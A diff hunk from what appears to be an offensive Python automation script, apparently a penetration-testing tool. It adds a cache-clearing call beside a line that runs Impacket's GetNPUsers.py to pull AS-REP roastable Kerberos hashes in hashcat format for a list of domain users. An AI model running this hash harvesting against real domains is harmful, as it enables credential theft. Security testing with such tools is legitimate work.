@@ -2509,6 +2509,7 @@ while True:
          if count == 0:
             print("[+] The authorised user file seems to be empty, so I am authorising everyone in the list..")
             localCOM("cp " + dataDir + "/usernames.txt authorised.tmp")
+         linecache.clearcache()
          countName = lineCount("authorised.tmp")
          print("[+] Checking " + str(countName) + " usernames...")
          remoteCOM(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp 2>&1 > temp.tmp")
